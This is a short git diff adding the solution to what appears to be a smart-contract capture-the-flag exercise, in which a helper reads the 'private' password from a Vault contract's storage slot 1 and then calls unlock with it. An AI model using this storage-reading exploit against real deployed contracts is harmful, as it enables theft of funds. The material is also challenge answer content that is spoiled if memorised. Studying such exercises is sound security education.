@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { ethers, waffle } from "hardhat";
+import { ethers, waffle, network } from "hardhat";
 
 const helper = async (victim: any) => {
   /* 
@@ -8,6 +8,10 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  let result = await ethers.provider.getStorageAt(victim.address, 1);
+  // result = ethers.utils.parseBytes32String(result);
+  // console.log(result);
+  await victim.unlock(result);
 };
 
 export default helper;
